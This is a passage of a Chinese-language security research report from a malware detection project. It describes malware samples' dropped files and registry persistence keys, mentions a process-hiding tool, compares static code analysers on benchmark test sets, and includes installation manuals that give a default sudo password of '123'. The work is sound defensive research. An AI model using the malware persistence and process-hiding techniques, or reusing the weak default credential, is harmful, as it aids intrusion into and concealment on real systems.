欲執行分析程式請雙擊該圖示後，選取”Run in terminal”。 
圖表 4-71 使用選項 
 
單一檔案的分析程式的使用方法 
圖表 4-72 檔案檢測系統使用者介面 
 
使用者可在文字方塊內輸入欲分析的目標檔案路徑，或使用右方的瀏覽鍵
以對話方塊選取目標。在輸入目標檔案路徑後，按下開始鍵即可開始分析。分
析過程中，中間的文字方塊將顯示詳細的分析資訊，下方的狀態列與進度表分
輸入目標檔案路徑 
瀏覽鈕 
開始鈕 
儲存鈕 
進度列 
狀態列 
分析報告 
 299 
 
這些可疑字串後是否安全，或詢問專業人員後，方可安全開啟。 
 Suspicious(可疑) 
目標在分析流程中有一個以上的測詴項目發現異常。應經過轉檔或
分析人員處理後方可開啟。 
 Malicious(惡意) 
目標確定含有 SEH/TEB/PEB Loading 的惡意程式碼，請勿開啟。 
 
 
圖表 4-74對目錄進行處理的DirForenser.sh的使用方法 
 
與分析單一檔案不同處在於，使用者必頇手動輸入欲掃描的目錄路徑，在
掃描usb隨身碟中的檔案時，目錄應設為/media/disk。且下方多出一整體進度列，
已告知使用者目前整體掃描進度。同時，掃描報告亦僅列出目錄中每個檔案的
威脅程度，若需得知更詳細的分析資訊，請使用 Forenser.py。請注意DirForenser.py
輸入目標檔案路徑 開始鈕 
儲存鈕 
分析項目進度列 
狀態列 
分析報告 
整體進度列 
 301 
 
4.3.1 文件檔案測詴結果報告 
含有 OLE 漏洞以及 call/pop 的 doc 檔案 1 
 
 
  
 303 
 
含有 OLE 漏洞以及 call/pop 的 xls 檔案 1 
 
 
 
 
  
 305 
 
 
 
 
  
 307 
 
 
  
 309 
 
安全的 bmp 檔案 
 
 
 
  
 311 
 
副檔名與檔案格式不相符檔案 
 
 
 
  
 313 
 
帶有可疑 API 與已知殼的執行檔 
 
 
  
 315 
 
取”ntdelect.com”當作示範。 
圖表 4-78 選擇檔案按鈕。 
 
圖表 4-79 選擇檔案視窗。 
 
  
 317 
 
4.3.2 惡意程式樣本測詴結果報告 
(a) ntdelect.com 
別名：Packed.Win32.NSAnti.r (Kaspersky), Generic.dx (McAfee), 
W32.Gammima.AG (Symantec), TR/Crypt.NSPM.Gen (Avira), 
Mal/Dorf-D (Sophos) 
行為： 
 新增%System%\kavo.exe 
 新增%System%\kavo0.dll 
 新增%Temp%\[RANDOM FILE NAME].dll 
 新增%System%\wincab.sys 
 新增登錄機碼
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersio
n\Run\"kava" = "%System%\kavo.exe" 
參考資料： 
Symantec 
http://www.symantec.com/zh/tw/security_response/writeup.jsp?docid=2007
-082706-1742-99&tabid=2 
 
Trend Micro 
http://about-threats.trendmicro.com/ArchiveMalware.aspx?language=tw&n
ame=WORM_NSPM.AEB 
  
 319 
 
 
  
 321 
 
 323 
 
(c) autorun.pif 
別名：Trojan.Win32.Pakes.dh (Kaspersky), W32.Arpiframe (Symantec),  
BDS/Hupigon.Gen (Avira), Mal/EncPk-E (Sophos) 
 
行為： 
 新增%Windows%\setuprs1.PIF 
 新增%Windows%\lsass.exe 
 新增登錄機碼
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\  
kkdc 
 
參考資料： 
Trend Micro 
http://about-threats.trendmicro.com/ArchiveMalware.aspx?language=tw&n
ame=WORM_RUNAUT.B 
 
  
 325 
 
 
  
 327 
 
Program C:\WINDOWS\WINLOGON.EXE 
參考資料： 
SOPHOS 
http://www.sophos.com/security/analyses/viruses-and-spyware/trojwowea.h
tml 
 329 
 
 
 331 
 
 333 
 
(f) futo.bat 
別名： 
行為： 
 隱藏 notepad.exe 程序 
 
附註：此樣本為一便利的工具，而非真實惡意程式；可讓使用者選擇某
執行檔後，在運行時期將該程序隱藏，使透過如 Taskmgr.exe 等程序列
舉工具所取得的程序列表無法觀察到特定程序的存在。在檢測過程，我
們指定 notepad.exe 為隱藏對象 
參考資料： 
  OpenRCE 
http://www.openrce.org/articles/full_view/19 
  
 335 
 
 
  
 337 
 
 339 
 
C. 軟體原始碼漏洞分析 
在軟體原始碼漏洞分析部分，我們將會有兩大章節來介紹。分別是效能評估
與準確性評估。 
4.3.3 原始碼靜態分析工具 - 效能評估 
各種靜態原始碼分析工具均有其效能特色，反映在不同執行時間、搜尋規
模、誤判(false positive)或是未檢出(false negative)比例上，且各項指標均有相當
程度關聯性。為比較各項不同的效能指標，我們以測詴程式集(benchmark suite)
檢驗各項整合帄台使用工具之檢測能力，整理檢測結果加以統計，以找出各項
靜態原始碼分析工具偵測能力不足的部分，藉由整合分析工具，增進靜態分析
判斷能力。 
以下針對 Java 以及 VB.NET 語言，對不同靜態原始碼分析工具，進行完整分
析以及統整報告。 
 Java 評估程式如下 
NIST SAMATE Reference Dataset Project 
NIST SAMATE Reference Dataset Project 是由美國標準與科技研究院
NIST(National Institute of Standards and Technology)建立的安全程式分析工具效能
評估資料庫，收集 C、C++、Java、PHP 原始碼，提供開發者、使用者靜態分析
工具效能評估研究之用，在 Java 部分目前共有 33 筆測詴資料。每筆測詴資料均
 341 
 
以下為使用 Fortify SCA 與 YASCA 檢測 NIST SAMATE Reference Dataset Project
之檢驗結果。 
以下為 Good case 分類： 
圖表 4-81NIST SAMATE Good case 分類 
 
 
Fortify SCA 檢測 Good case 結果： 
表格 4-17 Fortify SCA 檢測 SAMATE Good case 結果 
樣本數量 誤判數量 誤判比例 
13 10 76.92% 
 
Fortify SCA 誤判之漏洞項目： 
表格 4-18Fortify SCA 誤判之 SAMATE漏洞項目 
樣本名稱 分類 
File1_ok Path Manipulation 
0
1
2
3
Without Vulnerabilities (Total 13個) 
1 
3 
2 
1 
2 
1 1 
2 
Path Manipulation Hard coded password Memory Leak
Information Leak Log forging Command Injection
SQL Injection XSS
 343 
 
圖表 4-82SAMATE Good case 檢測結果比較 
 
由上圖可知，Fortify SCA 具較高誤判率，原因將在檢驗過 bad case 數據後統
一說明。 
 
以下為 Bad case 漏洞分類，SAMATE 樣本共 20 項： 
圖表 4-83NIST SAMATE Bad case 分類 
 
 
76.92% 
46.15% 
0.00%
10.00%
20.00%
30.00%
40.00%
50.00%
60.00%
70.00%
80.00%
90.00%
Fortify SCA YASCA
0
1
2
3
4
5
Vulnerabilities (Total 22個) 
5 
3 
1 1 
2 2 
1 1 1 
2 
1 1 1 
Path Manipulation Hard coded Password Memory Leak
Information Leak Log forging Access Private data
Command Injection SQL Injection Unchecked Exception
Unsafe Method Invocation XSS Weak Crypt Algorithm
Style mismatch
 345 
 
ResourceInjection2 Path Manipulation 
ResourceInjection Path Manipulation 
Unsafe1_bad An unsafe function is used causing the entire 
container to exit 
Unsafe2_bad An unsafe function is used causing the entire 
container to exit 
 
Fortify SCA 與 YASCA 檢測結果比較： 
圖表 4-84SAMATE Bad case 檢測結果比較 
 
 
由上圖可知，Fortify SCA 未檢出比率低於 YASCA，和先前針對 good case 所
作驗證相互比對可發現，Fortify SCA 整體分析策略較 YASCA 積極(aggresive)，因
此造成較低未檢出率與較高誤判率的情況，而 YASCA 誤判率較低，但未檢出率
較高。 
另外，我們分析 Fortify SCA 與 YASCA 未檢出項目可知，YASCA 對”Weak 
cryptography algorithm”與”coding style 相關”二項議題檢測能力較強。Weak 
20.00% 
50.00% 
0.00%
10.00%
20.00%
30.00%
40.00%
50.00%
60.00%
Fortify SCA YASCA
 347 
 
Fortify SCA 檢測 Good case 結果： 
表格 4-25Fortify SCA 檢測 Stanford SecuriBench Micro Good case 結果 
樣本數量 誤判數量 誤判比例 
248 106 42.74% 
 
Fortify SCA 誤判之漏洞項目： 
表格 4-26Fortify SCA 誤判之 Stanford SecuriBench Micro 漏洞項目 
漏洞類別 Good case 數量 誤判數量 
Command Injecr 44 44 
SQL Injection 35 35 
Cross-Site Scripting 47 8 
Path Manipulation 44 4 
Log Forging 46 8 
Write Line File 32 7 
 
YASCA 檢測 Good case 結果： 
表格 4-27YASCA 檢測 Stanford SecuriBench Micro Good case 結果 
樣本數量 誤判數量 誤判比例 
248 111 44.76% 
 
YASCA 誤判之漏洞項目： 
表格 4-28YASCA 誤判之 Stanford SecuriBench Micro 漏洞項目 
漏洞類別 Good case 數量 誤判數量 
Command Injecr 44 44 
SQL Injection 35 35 
Cross-Site Scripting 47 0 
Path Manipulation 44 0 
 349 
 
圖表 4-87Stanford SecuriBench Micro Bad case 樣本分類 
 
 
Fortify SCA 檢測 Bad case 結果： 
表格 4-29Fortify SCA 檢測 Stanford SecuriBench Micro Bad case 結果 
樣本數量 未檢出數量 誤判比例 
645 59 9.15% 
 
Fortify SCA 未檢出漏洞項目： 
表格 4-30Fortify SCA 未檢出 Stanford SecuriBench Micro 漏洞項目 
漏洞類別 Bad case 數量 未檢出數量 
Command Injecr 117 0 
SQL Injection 86 0 
Cross-Site Scripting 121 14 
Path Manipulation 120 17 
Log Forging 120 15 
Write Line File 81 13 
0
20
40
60
80
100
120
140
Vulnerabilities (Total 645個) 
117 
86 
121 120 120 
81 
Command Injection SQL injection Cross-Site Scripting
Path Manipulation Log Forging Write Local File
 351 
 
檢測結果發現 Fortify SCA 未檢出比例遠低於 YASCA，和 good case 數據相比
較後，發現 YASCA 對 Cross-site scripting、Path manipulation、與 Log forging 的誤
判率均為 0%，而未檢出比例卻高達 100%，推論原因為 YASCA 對此三項安全議
題檢測能力不足所致。對其他三項安全議題而言，YASCA 無未檢出情況，但誤判
率高達 100%，這表示 YASCA 對不同資料流或控制流的敏感度較低，而 Foritfy SCA
有少許誤判或未檢出情況產生，可能原因為靜態分析能力所限，無法擷取百分
之百的資料流或控制流資訊所致。 
 
綜合上述 Good case 及 Bad case 測詴資料結果，我們推論 Fortify SCA 檢測分
析較為謹慎，並具備較好的資料流與控制流分析能力，而 YASCA 策略較於保守，
資料流、控制流分析能力較 Fortify SCA 弱。另外，在檢驗測詴數據中發現，YASCA
在 Coding Style issue、Dead lock 檢驗以及 Thread 相關的 issue 方面的檢測，相對
的都比 Fortify 還突出。 
  
 353 
 
表格 4-33Fortify SCA 檢測自訂 VB.NET 測試樣本結果 
樣本數量 未檢出數量 誤判比例 
116 17 14.66% 
 
FxCop 檢測自訂 VB.NET 測詴樣本結果： 
表格 4-34FxCop 檢測自訂 VB.NET 測試樣本結果 
樣本數量 未檢出數量 誤判比例 
116 104 89.66% 
 
Fortify SCA 與 FxCop 檢測結果比較： 
圖表 4-90Fortify SCA 與 FxCop 檢測自訂 VB.NET測試樣本結果比較 
 
 
詳細檢測情形如下： 
漏洞類別 
Bad case
總數 
Fortify SCA
未檢出 
FxCop
未檢出 
Code Correctness to String on Array 10 0 10 
Cookie Security  30 0 30 
Denial of Service 6 1 6 
Header Manipulation 4 0 4 
14.66% 
89.66% 
0.00%
20.00%
40.00%
60.00%
80.00%
100.00%
檢測工具檢測結果 
Fortify FxCop
 355 
 
4.3.4 原始碼靜態分析工具－回報準確率評估 
接下來將探討，當各項原始碼靜態分析工具回報某項議題時，回報項目準
確率為何。由 4.2.10 討論可知，工具回報某項議題時，可能情況有 (1)確實存在
該議題 (2)誤判，因此我們以條件機率公式配合上一小節整理的分析結果，統計
出各工具回報議題的準確程度，並列於整合帄台的數據報告中，供使用者參考
該議題準確程度，工具回報準確率呈現方式如下圖： 
圖表 4-91 分析平台 GUI 及報表 
 
以下是我們整理先前分析數據，套入工具回報準確率公式的計算結果，公
式化簡後為： 
工具回報準確率  =  
𝐵𝐶−𝐹𝑁
𝐹𝑃+(𝐵𝐶−𝐹𝑁)
 
表格 4-35 工具準確率公式代號 
BC Bad case 數量 
FN 未檢出數量 
FP 誤判數量 
 
Java 語言工具回報準確率結果： 
 357 
 
Buffer overflow 98.23% 65.83% 96.66% 
Format String 72.73% 71.43% 62.50% 
Integer overflow 100.00%  100.00% 
Race condition 100.00% 50.00%  
Error free 94.74% 66.67% 100.00% 
hardcoded password 100.00%   
Null deference 100.00% 100.00% 83.33% 
 
以上統計表格中，空白欄位原因為我們捨棄”工具無法檢測之項目”的準確率評估，
當該工具對特定議題檢測能力薄弱時，被工具回報的機會本身已非常低，如工
具無法檢測特定議題，則根本不會顯示在工具回報上，因此不頇探討其準確率。
另外，上表中”統計”欄位顯示的是該工具”可檢測項目”的帄均值，亦忽略無法檢
測項目。 
 
在本研究中，我們利用蒐集與自己修改的測詴程式集，對 Java 與 VB.NET 做
一系列能力檢測，並由檢測數據推算不同工具對不同議題回報之準確率。我們
發現 Fortify SCA 對於 Coding style、Dead lock、及 Thread 同步相關議題檢測能力
較弱，而這些項目正是 YASCA 和 FxCop 的檢測強項，因此 YASCA 和 FxCop 可與
Fortify SCA 互補，增加整合帄台的檢測能力。另外，我們也從測詴程式集的分析
報告中，帶入”工具回報準確率”評估公式，以提供不同工具對不同議題的回報可
信度供使用者參考，幫助程式開發人員更快速定位可能安全議題所在。結合上
述二大重點，整合分析帄台可提供更強大的靜態原始碼安全檢測能力，也達到
本計畫之目標。 
 359 
 
Freeware，利用其不同的靜態分析檢驗方式來彌補Fortify SCA相關檢測的不足，
並靠近似方法盡可能定位潛在程式安全漏洞，藉此幫助程式設計者及早處理安
全漏洞，以增加程式安全性與可靠性。 
在實作上，主要開發出檔案文件偵測系統，透過使用者端與專家端的配合，
預期可以將惡意程式或帶有惡意程式的文件先於使用者端被發現，避免交叉感
染；然後透過使用者端的及時回報機制，將惡意程式或帶有惡意程式的檔案於
虛擬機器中取得其運作模式及感染途徑，使得發佈因應方案之時程縮短，減少
受害範圍及減輕受害程度。 
此系統之開發不僅僅針對可執行檔的分析，也加入了一般文件的檢測。利
用多面向的分析技術，如：靜態的 PE 檔案格式分析、檔案內容分析、資訊熵以
及動態地去偵測堆疊中的資料是否有不正當的利用等等，皆可協助鑑識人員來
辨別此檔案的安全性。此外，本系統開發了使用者介面，不僅讓專家鑑識人員
方便使用，也讓一般使用者更容易上手。最後，為了顧及系統的可擴充性，大
量的可調整的設定檔案，讓此分析系統更加的具有彈性。 
本計畫在過去一年半內，不僅研究成果豐碩實作出許多實務的系統，貼切
時下的資安問題。其計畫所發表的論文，更在今年五月於「第二十屆全國資安
會議」，得到了最佳學生論文候選。這證明了本計畫的研究題目，不論在研究深
度、研究價值或實作門檻，都受到國內資訊安全學界的認同。這樣新穎且具有
創新思考的研究方向，確實值得投入大量人力以完成更豐碩的成果。也因此，
本研究中心也培育了大量資安人才，更加地鞏固國內資訊安全領域的實力。盼
 361 
 
6 參考文獻 
[1] Min Gyung Kang, Pongsin Poosankam, and Heng Yin ,“Renovo: A hidden code 
extractor for packed executables.”, In Proceedings of the 5th ACM Workshop on 
Recurrin Malcode (WORM'07), October 2007. 
[2] Anubis. http://analysis.seclab.tuwien.ac.at. 
[3] BitBlaze Binary Analysis Platform. http://bitblaze.cs.berkeley.edu/. 
[4] M. Christodorescu, J. Kinder, S. Jha, S. Katzenbeisser, and H.Veith. ,“Malware 
normalization.” Technical Report 1539, University of Wisconsin, Madison, Nov 
2005, Wisconsin, USA. 
[5] Y. L. Huang , F. S. Ho , H. Y. Tsai , and H. M. Kao, “A control flow obfuscation 
method to discourage malicious tampering of software codes”, Proceedings of 
the 2006 ACM Symposium on Information, computer and communications 
security, March 21-24 2006, Taipei, Taiwan. 
[6] Christopher Kruegel , William Robertson , Fredrik Valeur , and Giovanni Vigna, 
“Static disassembly of obfuscated binaries”, Proceedings of the 13th conference 
on USENIX Security Symposium, p.18-18, August 09-13 2004, San Diego, CA. 
[7] Cullen Linn , and Saumya Debray, “Obfuscation of executable code to improve 
resistance to static disassembly”, Proceedings of the 10th ACM conference on 
Computer and communications security, October 27-30, 2003, Washington D.C., 
USA  
[8] McAfee. Advanced virus detection scan engine and DATs. 
http://www.mcafee.com/us/local_content/white_papers/wp_scan_engine.pdf. 
[9] Paul Royal , Mitch Halpin , David Dagon , Robert Edmonds , and Wenke Lee, 
“PolyUnpack: Automating the Hidden-Code Extraction of Unpack-Executing 
Malware”, Proceedings of the 22nd Annual Computer Security Applications 
Conference on Annual Computer Security Applications Conference, p.289-300, 
December 11-15, 2006  
 363 
 
of the 2006 IEEE Symposium on Security and Privacy, p.2-16, May 21-24, 2006.  
[20]  David Brumley , Hao Wang , Somesh Jha , and Dawn Song, “Creating 
Vulnerability Signatures Using Weakest Preconditions”, Proceedings of the 20th 
IEEE Computer Security Foundations Symposium, p.311-325 ,July 06-08, 2007. 
[21] Jay Munro, “Antivirus Research and Detection Techniques”, Antivirus Research 
and Detection Techniques, ExtremeTech, 2002, available at 
http://www.extremetech.com/article2/0,2845, 367051,00.asp. 
[22] S. J. Stolfo, K. Wang, and W. J. Li, “Towards Stealthy Malware Detection”, 
Advances in Information Security, Vol. 27, pp. 231--249, 2007, Springer, USA, 
2007. 
[23] P. Kierski, M. Okoniewski, and P. Gawrysiak, “Automatic Classification of 
Executable Code for Computer Virus Detection”, International Conference on 
Intelligent Information Systems, pp. 277--284, Springer, Poland, 2003. 
[24] FindBugs, http://findbugs.sourceforge.net/ 
[25] FxCop, http://msdn.microsoft.com/en-us/library/bb429476(VS.80).aspx 
[26] LAPSE, http://suif.stanford.edu/~livshits/work/lapse/index.html 
[27] K Tsipenyuk, B Chess, G McGraw, Seven Pernicious Kingdoms: A Taxonomy of 
Software Security Errors, IEEE Security and Privacy, Dec. 2005 
[28] SAMETE Reference Dataset Project, http://samate.nist.gov/Main_Page.html 
[29] Stanford SecuriBench Micro, 
http://suif.stanford.edu/~livshits/work/securibench-micro/ 
[30] R. Lyda and J. Hamrock, “Using Entropy Analysis to Find Encrypted and Packed 
Malware,” Security & Privacy, IEEE,  vol. 5, 2007, pp. 40-45. 
[31] FCKeditor.Java Integration, http://java.fckeditor.net/ 
[32] CVE-2009-4875, 
http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-4875 
[33] CVE-2010-0886, 
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0886 
 365 
 
[52] Microsoft Security Bulletin, MS10-031 – Critical, 
http://www.microsoft.com/technet/security/bulletin/ms10-031.mspx 
[53] US-CERT, Microsoft Visual Basic for Applications buffer overflow, 
http://www.kb.cert.org/vuls/id/159484 
[54] Microsoft Security Bulletin, MS06-047, 
http://www.microsoft.com/technet/security/Bulletin/MS06-047.mspx 
[55] SecurityFocus, Microsoft Visual Basic for Applications Document Check Buffer 
Overflow Vulnerability, http://www.securityfocus.com/bid/19414/discuss 
[56] Secunia, Microsoft Visual Basic for Applications Buffer Overflow, 
http://secunia.com/advisories/21408 
[57] Security Tracker, Microsoft Visual Basic for Applications Buffer Overflow Lets 
Remote Users Execute Arbitrary Code, 
http://securitytracker.com/alerts/2006/Aug/1016656.html 
[58] SecurityFocus, Microsoft Charts ActiveX Control Memory Corruption 
Vulnerability, http://www.securityfocus.com/bid/32614 
[59] Microsoft Security Bulletin, MS08-070 – Critical, 
http://www.microsoft.com/technet/security/Bulletin/MS08-070.mspx 
[60] Avaya, Runtime Extended Files (ActiveX Controls) Could Allow Remote Code 
Execution, http://support.avaya.com/elmodocs2/security/ASA-2008-473.htm 
[61] OVAL, Charts Control Memory Corruption Vulnerability, 
http://oval.mitre.org/repository/data/getDef?id=oval:org.mitre.oval:def:5651 
[62] IBM, Microsoft Visual Basic Enterprise Edition .dsr file buffer overflow, 
http://xforce.iss.net/xforce/xfdb/39773 
[63] SecurityFocus, Microsoft Visual Basic Enterprise Edition 6 DSR File Handling 
Buffer Overflow Vulnerabilities, http://www.securityfocus.com/bid/27349 
[64] Security Tracker, Microsoft Visual Basic '.dsr' File Buffer Overflow Lets Remote 
Users Execute Arbitrary Code, 
http://securitytracker.com/alerts/2008/Jan/1019258.html 
 367 
 
7 附錄 A-惡意帄台分析安裝及操作手冊 
1. 簡介 
本文件將簡介 MBA LiveCD 的安裝以及操作方式。本安裝光碟適用於相容於
i386或是 x86_64帄台架構。MBA是一套利用虛擬機器技術，檢測惡意程式的分
析帄台。藉由著虛擬機器的技術來達到完全的觀測惡意程式的行為。為了效能
上的考量，本系統不建議安裝在虛擬機器之上。本分析系統需要充裕的記憶體
空間，故建議的記憶體空間為 8GB，如果沒有充裕的記憶體空間，則分析速度將
會比較緩慢。 
  
 369 
 
3. 圖表目錄 
Figure 1 放入 MBA LiveCD，出現開機畫面選項。 ......................... 370 
Figure 2 開機選單畫面 ............................................... 371 
Figure 3 進入 Ubuntu 等待畫面 ....................................... 371 
Figure 4 選擇語系畫面 ............................................... 372 
Figure 5 選擇時區畫面 ............................................... 372 
Figure 6 鍵盤配置畫面。 ............................................. 373 
Figure 7 硬碟分割畫面。 ............................................. 373 
Figure 8 使用者創建畫面。 ........................................... 374 
Figure 9 最終安裝選項確定畫面 ....................................... 374 
Figure 10 安裝中的畫面。 ............................................ 375 
Figure 11 完成安裝時的畫面。 ........................................ 375 
Figure 12 修改 vim /etc/fstab畫面。 ................................. 376 
Figure 13 /etc/fstab開啟畫面，新增紅框部分的指令。 .................. 376 
Figure 14 創造/mnt/ramdisk 輸入畫面。 ............................... 377 
Figure 15 掛載 tmpfs，並且條列所有已經掛載的磁區，此圖最下方顯示已成功掛
載 4G的 ramdisk。 ................................................ 377 
Figure 16 利用 update-grub來更新可開機磁區選項。 .................... 378 
Figure 17 選擇"start_MBA.sh"開始執行分析程式。 ...................... 379 
Figure 18 選擇在"終端機"執行該分析程式。 ............................ 379 
Figure 19 選擇檔案按鈕。 ............................................ 315 
Figure 20 選擇檔案視窗。 ............................................ 381 
Figure 21 執行中的終端機顯示進度條。 ................................ 382 
Figure 22 分析結果報告。 ............................................ 316 
 
  
 371 
 
步驟二：出現開機選單之後，選擇”install”選項，進入安裝畫面。 
Figure 3 開機選單畫面 
 
步驟三：此時系統將會載入安裝核心，並且顯示等待畫面。 
Figure 4 進入 Ubuntu 等待畫面 
 
  
 373 
 
步驟六：選擇鍵盤 Layout (預設為 USA)，直接下一步。 
Figure 7 鍵盤配置畫面。 
 
步驟七：選擇安裝硬碟，下圖是選擇整顆硬碟。(進階使用者可以自行選擇磁區
分割) 
Figure 8 硬碟分割畫面。 
 
  
 375 
 
步驟十：安裝中，等到 100%則安裝完畢。 
Figure 11 安裝中的畫面。 
 
步驟十一：完成安裝。桌面上”start_MBA.sh”將是 MBA的執行檔案。 
Figure 12 完成安裝時的畫面。 
 
  
 377 
 
Figure 15 創造/mnt/ramdisk 輸入畫面。 
 
掛載/mnt/ramdisk，並且確定是否掛載成功。 
sudomount –a; df –h           
Figure 16 掛載 tmpfs，並且條列所有已經掛載的磁區，此圖最下方顯示已成功掛載 4G 的 ramdisk。 
 
  
 379 
 
6. 操作手冊 
在執行前置作業［第三章節］後的 MBA 系統中，桌面上可以看到有
start_MBA.sh的快捷。 
點擊兩次之後，將會出現詢問執行方式。選擇”Run in Terminal”，將會出現
要求系統密碼。系統的 sudo 密碼預設為”123”。輸入密碼之後，將會用系統
權限來執行 MBA，並且在畫面中央出現一個檔案選擇視窗。 
Figure 18 選擇"start_MBA.sh"開始執行分析程式。 
 
Figure 19 選擇在"終端機"執行該分析程式。 
 
  
 381 
 
Figure 21 選擇檔案視窗。 
 
  
 383 
 
7. 結論 
本計劃將研究如何取出所有檔案相關的資訊以提供使用者參考。去年的研究
成果已完成了針對二進位的可執行檔，透過虛擬機器內外部分析的方式，找出
其侵入行為與隱藏行為。但由於並非所有檔案皆可以被執行。在今年度，本研
究計畫加上了對普通檔案文件的分析方法。普通文件無法直接利用去年成果之
分析手法來獲得相關行為資訊，故開發了檔案文件分析系統來互補與加強分析
範圍。由於惡意文件檔案可能利用應用程式漏洞來取得執行控制權，進一步入
侵作業系統。此方式結合了靜態與動態分析的技術，提供鑑識人員一些辨識的
依據。今年度不但擴充了檢測項目，還整合了報告介面，提供更人性化的選擇
畫面。最終的報告將用 html來呈現，不會因在不同的作業系統帄台上，而有不
同的畫面結果。 
  
 385 
 
目次 
I  Integrated Source Code Analysis Tool 簡介 ...................................................... 387 
1.1 目的387 
1.2 系統需求 ............................................ 387 
II. Integrated Source Code Analysis Tool 安裝與設定 ............................................... 388 
2.1 VISUAL STUDIO 2008安裝 ................................ 388 
2.2 FORTIFY SCA V2.6.5安裝 ............................... 392 
2.3 JAVA DEVELOPMENT TOOLKIT 1.6 UPDATE 17 安裝 .............. 396 
2.4 DEV-C++ 4.9.9.2安裝 ................................. 398 
2.5 MICROSOFT FXCOP 1.36安裝 .............................. 400 
2.6 INTEGRATED SOURCE CODE ANALYSIS TOOL安裝 .................. 402 
2.7編譯供JNI使用之DLL檔 ................................. 403 
2.8 INTEGRATED SOURCE CODE ANALYSIS TOOL系統環境設定 .......... 404 
III.  Integrated Source Code Analysis Tool 專案功能 .............................................. 405 
3.1 INTEGRATED SOURCE CODE ANALYSIS TOOL 專案功能介紹 ......... 405 
3.1.1 新增專案 405 
3.1.2 儲存專案設定 406 
3.1.3 開啟專案 406 
3.1.4 分析工具選擇設定 407 
3.1.5 儲存書面報表 407 
IV. Integrated Source Code Analysis Tool 檢測功能 ................................................ 408 
 387 
 
I  Integrated Source Code Analysis Tool 簡介 
   1.1 目的 
    Integrated Source Code Analysis Tool (以下稱 ISCA)為一靜態原始碼安全檢
測帄台，整合了 Fortify SCA、YASCA、Microsoft FxCop、CBMC 等四項靜態原
始碼分析工具，其功能包括提供方便操作介面、統整各工具分析報告、安全漏
洞議題準確率評估、互動報告介面、書面統整報表輸出、ISCA 專案管理等。可
供使用者方便使用各靜態分析工具進行分析，更快速定位可能的安全性議題，
在程式開發階段即可加以修正，節省額外成本。 
    ISCA 主要目的除安全議題檢測外，更包含程式品質(code quality)檢測，確
保程式開發品質，也減少因程式品質不佳造成潛在問題(bug)，進而產生安全性
漏洞。 
 
1.2 系統需求 
    * Windows XP Professional、Windows 7 Enterprise、 
或 Windows 7 Professional [1] 
* Java Runtime Environment (JRE) 1.6 版以上 [2] 
    * Fortify SCA v2.6.5 
    * Visual Studio 2008 [3] 
    * gcc & g++ [4] 
    * Microsoft FxCop 1.36 
 
[1] 已在上述作業系統測詴完畢，ISCA 經適度修改後可移植至其他作業系統，
如 Linux。 
[2] 如需修改 ISCA 原始碼，需使用 Java Development Toolkit (JDK) 1.6 版以上，
並搭配 Eclipse RCP (Rich Client Platform) IDE。 
[3] Visual Studio 2005、2003 未測詴。 
[4] 建議使用方案為(1) Dev-C++ 或(2) MinGW，本文件以 Dev-C++為例。 
 
 
  
 389 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
    步驟二：選擇安裝目錄與安裝功能，在此選擇”預設”。 
 
 
 
 
 
 
 
 
 
 
 
 
 
        註：Fortify SCA檢測 VB.NET 需先安裝 Visual Studio 之 VB.NET功能。 
 
  
 391 
 
        5.2  以命令列模式執行 Visual C++編輯器 (cl.exe)，測詴是否正確。 
% [Visual Studio 目錄] \ VC \ vcvarsall.bat 
% cl.exe  
          測詴結果： 
 
 
 
 
 
 
 
 
 
 
 
 
 
至此，Visual Studio 2008 安裝與系統設定完畢。 
 
 
  
 393 
 
    步驟二：選取 license key file 所在目錄。 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
    步驟三：選取 Fortify SCA v2.6.5 安裝目錄 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
  
 395 
 
    步驟六：設定 Fortify SCA 檢設規則檔(rulepack)，此處我們不選擇線上下載 
            方式，而手動設置 rulepack 檔。 
        6.1 選擇不進行線上下載 
 
 
 
 
 
 
 
 
 
 
 
 
 
        6.2 將安裝光碟中所有 rulepack 檔(*.bin)複製到 
[Fortify SCA 目錄] \ Core \ config \ rules 目錄下 
 
 
 
 
 
 
 
 
 
 
 
 
 
至此，Fortify SCA v2.6.5 安裝完成。 
  
 397 
 
    步驟三：在系統環境變數 Path 加上[JDK 目錄] \ bin。 
        (Windows XP)  我的電腦(右鍵) → 內容 → 進階標籤 → 環境變數  
                      → 系統變數選取 Path → 編輯 →  
加上 ;[JDK 目錄] \ bin (注意冒號) 
        (Windows 7)    電腦(右鍵) → 內容 → 進階系統設定 → 進階標籤  
                      → 環境變數 → 系統變數選取 Path → 編輯 → 
加上 ;[JDK 目錄] \ bin (注意冒號) 
 
    步驟四：以命令列模式執行 javac (Java 編譯器)，確認安裝正確與否。 
          
 
 
 
 
 
 
 
 
 
 
 
至此，Java Development Toolkit 安裝完成。 
 
  
 399 
 
    步驟三：安裝完成後，請先執行 Dev-C++主程式，進行環境設定。 
 
 
 
 
 
 
 
 
 
 
 
 
 
    步驟四：環境設定完成後，關閉 Dev-C++ IDE 視窗，並設定 Path 系統環境 
            變數，加上 [Dev-C++目錄] \ bin。 
(Windows XP)  我的電腦(右鍵) → 內容 → 進階標籤 → 環境變數  
                      → 系統變數選取 Path → 編輯 →  
加上 ; [Dev-C++目錄] \ bin (注意冒號) 
        (Windows 7)    電腦(右鍵) → 內容 → 進階系統設定 → 進階標籤  
                      → 環境變數 → 系統變數選取 Path → 編輯 → 
加上 ; [Dev-C++目錄] \ bin (注意冒號) 
     
    步驟五：以命令列模式測詴 gcc、g++功能可否正常使用。 
 
 
 
 
 
 
 
至此，Dev-C++ 4.9.9.2 安裝完畢。 
 
 
  
 401 
 
    步驟三：安裝完畢後，測詴[FxCop 目錄] \ FxCop.exe (FxCop GUI 介面)， 
            或[FxCop 目錄] \ FxCopCmd.exe (FxCop console 模式)，檢查是否 
            正確安裝。 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
至此，Microsoft FxCop 1.3.6 安裝完成。 
 
 
  
 403 
 
2.7 編譯供 JNI 使用之 DLL 檔 
    本節將介紹如何編譯本機端供 ISCA JNI 功能使用之 DLL 檔，進行下一步前
請先安裝 Visual C++ (Visual Studio)，並確定 Visual C++編譯器(以下稱 CL)可正
常運作。 
    步驟一：至 ISCAPackage \ jni 目錄下，取出 
ExecProc.c、NativeExecInterface.java。 
 
